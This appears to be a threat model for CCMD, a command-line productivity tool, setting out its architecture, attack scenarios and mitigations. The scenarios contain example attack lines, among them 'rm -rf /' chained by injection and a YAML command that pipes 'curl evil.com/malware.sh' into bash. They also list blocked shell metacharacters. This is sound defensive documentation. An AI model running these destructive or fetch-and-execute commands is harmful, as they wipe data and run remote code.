# CCMD Threat Model

**Version:** 1.1.5
**Last Updated:** October 30, 2025
**Status:** Active Development

## Overview

This document describes CCMD's security architecture, threat boundaries, attack scenarios, and mitigations. CCMD is a command-line tool that enhances terminal productivity while maintaining security-first design principles.

## System Architecture

### Components

```
┌─────────────────────────────────────────────────────────────┐
│ User Shell (bash/zsh/fish/PowerShell)                       │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ CCMD Shell Integration (functions/aliases)              │ │
│ └──────────────────┬──────────────────────────────────────┘ │
└────────────────────┼────────────────────────────────────────┘
                     │
                     ▼
         ┌──────────────────────┐
         │  run.py Entry Point  │
         └──────────┬───────────┘
                    │
         ┌──────────▼───────────┐
         │  CLI Layer (main.py) │
         │  - Argument Parsing  │
         │  - Flag Handling     │
         └──────────┬───────────┘
                    │
    ┌───────────────┼───────────────┐
    │               │               │
    ▼               ▼               ▼
┌────────┐   ┌──────────┐   ┌──────────┐
│Registry│   │Executor  │   │Security  │
│Module  │   │Module    │   │Module    │
└────────┘   └──────────┘   └──────────┘
    │               │               │
    └───────────────┼───────────────┘
                    │
         ┌──────────▼───────────┐
         │  System (OS/Shell)   │
         │  - File System       │
         │  - Process Execution │
         └──────────────────────┘
```

### Trust Boundaries

1. **User ↔ CCMD**: User inputs commands, CCMD validates and executes
2. **CCMD ↔ System**: CCMD executes validated commands on the system
3. **Configuration Files ↔ CCMD**: YAML configs define command behavior
4. **Shell Integration ↔ CCMD**: Shell functions call Python process

## What CCMD Can Access

### Capabilities

CCMD operates with the **same privileges as the user** who runs it:

- ✅ Read/write files the user can access
- ✅ Execute commands the user can run
- ✅ Modify shell configuration files (~/.bashrc, ~/.zshrc, etc.)
- ✅ Access environment variables
- ✅ Create/delete processes
- ✅ Network access (if user has it)

### Explicit Limitations

CCMD **CANNOT**:

- ❌ Escalate privileges (cannot run as root unless user is root)
- ❌ Access files outside user permissions
- ❌ Bypass OS security mechanisms
- ❌ Execute commands if user doesn't have permission
- ❌ Modify system-wide configurations (unless user is admin)

## Attack Scenarios and Mitigations

### 1. Command Injection

**Attack:** Malicious user tries to inject shell metacharacters to execute arbitrary commands

```bash
ccmd "ls; rm -rf /" # Attempt to chain destructive command
```

**Mitigation:**
- ✅ **CommandSecurityValidator** blocks dangerous characters: `;`, `&&`, `||`, `|`, `$()`, `` ` ``
- ✅ Commands use `shell=False` by default
- ✅ Input sanitization in `ccmd/core/security.py:50-80`
- ✅ Allow-chaining only for validated custom commands

**Code Reference:** `ccmd/core/security.py:CommandSecurityValidator`

---

### 2. Arbitrary Code Execution via --exec

**Attack:** External user tries to bypass validation using the internal --exec flag

```bash
ccmd --exec "rm -rf /important/data" # Direct execution attempt
```

**Mitigation (v1.1.5):**
- ✅ **--exec flag hidden** from help text (argparse.SUPPRESS)
- ✅ **Environment variable gate** requires `CCMD_INTERNAL=1`
- ✅ Only internal command chaining can set this variable
- ✅ External calls blocked with error message

**Code Reference:** `ccmd/cli/main.py:308-309`, `ccmd/cli/main.py:967-982`

---

### 3. Malicious Command Definitions

**Attack:** Attacker modifies `commands.yaml` to inject malicious commands

```yaml
custom_malware:
  action: "curl evil.com/malware.sh | bash"
  description: "Innocent-looking description"
```

**Mitigation:**
- ✅ **Custom commands forced to type='custom'** (cannot be 'system')
- ✅ **Sensitive pattern detection** auto-flags dangerous commands
- ✅ **Master password protection** for sensitive operations
- ✅ YAML validation on load
- ⚠️ **User responsibility**: Don't add untrusted commands to YAML

**Code Reference:** `ccmd/core/registry.py:100-150`

---

### 4. Shell Configuration Corruption

**Attack:** Installation or update corrupts shell config, leaving user with broken shell

```bash
# Partial write due to crash:
export CCMD_HOME="/path/to/ccmd
# Missing closing quote - shell breaks
```

**Mitigation (v1.1.5):**
- ✅ **Atomic writes** using temp file + rename (prevents partial writes)
- ✅ **Automatic backups** before every modification
- ✅ **Auto-recovery** on installation failure
- ✅ **Shell syntax validation** (optional)
- ✅ **Rollback system** with manifest tracking

**Code Reference:** `ccmd/core/rollback.py:219-314`

---

### 5. Password Bypass (Sensitive Commands)

**Attack:** User tries to circumvent master password protection

```bash
# Attempt 1: Direct command execution
ssh root@server # Should require password

# Attempt 2: Edit YAML to remove require_password flag
```

**Mitigation:**
- ✅ **Auto-detection of sensitive commands** (even if flag not set)
- ✅ **Bcrypt hashing** with 12 rounds (secure against brute force)
- ✅ **PBKDF2 fallback** if bcrypt unavailable
- ✅ **SSH key permission validation** (must be 600)
- ✅ **Sensitive pattern matching** (40+ patterns)

**Code Reference:** `ccmd/core/auth.py:50-150`

---

### 6. Path Traversal / Directory Confusion

**Attack:** CCMD points to wrong installation directory, executes unintended code

```bash
export CCMD_HOME="/tmp/fake_ccmd"
ccmd update # Loads malicious commands.yaml from /tmp
```

**Mitigation (v1.1.5):**
- ✅ **Path validation** on startup
- ✅ **Diagnostic command**: `ccmd --check-paths`
- ✅ **Error handling** with helpful messages
- ✅ **One-time warning** per shell session if path invalid
- ⚠️ **User responsibility**: Verify CCMD_HOME points to correct directory

**Code Reference:** `ccmd/cli/main.py:handle_check_paths()` (v1.1.5)

---

### 7. Dependency Vulnerabilities

**Attack:** Attacker exploits vulnerable dependency (PyYAML, bcrypt, etc.)

**Mitigation:**
- ✅ **Pinned dependencies** in `requirements.txt`
- ✅ **Security scanning** (Bandit, Safety, CodeQL)
- ✅ **Dependabot** for automated updates (v1.1.5)
- ✅ **Regular audits** before each release
- ✅ **Minimal dependencies** (only PyYAML, bcrypt, passlib)

**Code Reference:** `.github/workflows/dependabot.yml`

---

## Security Design Principles

### 1. Principle of Least Privilege
- CCMD runs with **user privileges only**
- No setuid/setgid bits
- No privilege escalation attempts

### 2. Defense in Depth
- **Multiple validation layers**: Parser → Validator → Executor
- **Input sanitization** at every stage
- **Backup before modification**

### 3. Fail-Safe Defaults
- **Shell operators blocked** by default
- **Master password required** for sensitive commands
- **Atomic writes** enabled by default

### 4. Complete Mediation
- **All commands validated** before execution
- **No bypass mechanisms** (--exec is internal-only)

### 5. Separation of Concerns
- **Security module** separate from execution
- **Authentication** separate from authorization
- **Validation** separate from command execution

## What CCMD Protects Against

| Threat | Protection | Severity |
|--------|-----------|----------|
| Command injection | Input validation, character blocking | HIGH |
| Arbitrary code execution | --exec gating, validation | HIGH |
| Malicious configs | Custom command restrictions | MEDIUM |
| Shell corruption | Atomic writes, backups, recovery | MEDIUM |
| Password bypass | Auto-detection, bcrypt hashing | MEDIUM |
| Path confusion | Validation, diagnostics | LOW |
| Dependency vulnerabilities | Scanning, pinning, updates | VARIES |

## What CCMD Does NOT Protect Against

| Threat | Reason | User Mitigation |
|--------|--------|----------------|
| **User running malicious commands** | CCMD executes what user tells it to | Review commands before running |
| **Compromised user account** | CCMD has same privileges as user | Secure your account |
| **Malicious admin** | Admin can modify CCMD code | Only install from trusted sources |
| **Physical access attacks** | Attacker with physical access can do anything | Encrypt disk, lock screen |
| **Zero-day OS vulnerabilities** | CCMD relies on OS security | Keep OS updated |
| **Social engineering** | User voluntarily adds malicious commands to YAML | Only add trusted commands |
| **Keyloggers / Malware** | OS-level compromise | Use antivirus, keep system clean |

## Security Validation Process

### Pre-Release Checklist

Before every release, CCMD undergoes:

1. ✅ **Static Analysis**: Bandit scan (0 HIGH severity issues)
2. ✅ **Dependency Scanning**: Safety check (no known vulnerabilities)
3. ✅ **Code Quality**: CodeQL analysis
4. ✅ **Manual Review**: Security-critical code reviewed
5. ✅ **Test Coverage**: Security tests passing
6. ✅ **Documentation**: Threat model updated

### Continuous Monitoring

- 🤖 **Dependabot**: Automated dependency updates
- 🔍 **GitHub Security**: Automated vulnerability scanning
- 📊 **Community Reports**: Responsible disclosure via SECURITY.md

## Incident Response

### If You Discover a Vulnerability

1. **Do NOT** open a public GitHub issue
2. **Email:** Robert5560newton@gmail.com
3. **Include:** Description, steps to reproduce, impact assessment
4. **Expect:** Response within 48 hours, fix within 7 days for critical issues

### Severity Levels

- **CRITICAL**: Remote code execution, privilege escalation → Fix within 24h
- **HIGH**: Authentication bypass, data exposure → Fix within 7 days
- **MEDIUM**: Denial of service, config corruption → Fix within 30 days
- **LOW**: Information disclosure, minor bugs → Fix in next release

## Version History

### v1.1.5 (October 30, 2025)
- Added --exec environment gate (CCMD_INTERNAL)
- Implemented atomic shell config writes
- Added shell syntax validation
- Created THREAT_MODEL.md and RECOVERY.md

### v1.1.4 (October 30, 2025)
- Security hardening release
- 0 HIGH severity vulnerabilities
- Published to PyPI

### v1.1.2 (October 28, 2025)
- Added master password system (bcrypt)
- Command injection prevention
- Sensitive command auto-detection

## References

- **Security Policy:** [SECURITY.md](SECURITY.md)
- **Security Changelog:** [SECURITY_CHANGELOG.md](SECURITY_CHANGELOG.md)
- **Recovery Guide:** [RECOVERY.md](RECOVERY.md)
- **Contribution Guidelines:** [CONTRIBUTING.md](CONTRIBUTING.md)

## Contact

- **Developer:** De Catalyst (@Wisyle)
- **Email:** Robert5560newton@gmail.com
- **GitHub:** https://github.com/Wisyle/ccmd
- **Security Reports:** Robert5560newton@gmail.com (private disclosure)

---

**Remember:** CCMD is a productivity tool, not a security boundary. It enhances safety through validation and backups, but cannot protect against a compromised user account or malicious OS-level attacks.

For questions about this threat model, open a GitHub discussion or contact the maintainer.
